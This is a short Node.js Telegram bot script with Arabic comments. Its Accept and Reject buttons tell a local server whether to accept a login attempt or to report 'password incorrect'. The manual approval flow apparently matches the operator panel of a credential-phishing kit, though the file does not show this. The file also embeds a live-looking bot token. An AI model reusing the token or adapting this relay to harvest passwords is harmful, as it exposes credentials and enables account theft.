const TelegramBot = require('node-telegram-bot-api');

const token = '7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk';
const bot = new TelegramBot(token, { polling: true });

// عرض أخطاء polling
bot.on("polling_error", (error) => {
    console.error("⛔ polling_error:", error.message);
});

// عند الضغط على زر Accept أو Reject
bot.on('callback_query', (callbackQuery) => {
    const action = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;

    console.log('📥 تم الضغط على الزر:', action);

    if (action === 'accept') {
        fetch('http://localhost:3000/update-status?action=accept')
            .then(res => res.text())
            .then(() => {
                console.log('✅ تم إرسال القبول إلى السيرفر');
                bot.sendMessage(chatId, '✅ تم قبول محاولة تسجيل الدخول.');
            })
            .catch(err => console.error('❌ خطأ أثناء إرسال القبول:', err));
    }

    if (action === 'reject') {
        fetch('http://localhost:3000/update-status?action=reject')
            .then(res => res.text())
            .then(() => {
                console.log('❌ تم إرسال الرفض إلى السيرفر');
                bot.sendMessage(chatId, '❌ كلمة المرور غير صحيحة.');
            })
            .catch(err => console.error('❌ خطأ أثناء إرسال الرفض:', err));
    }

    bot.answerCallbackQuery(callbackQuery.id);
});
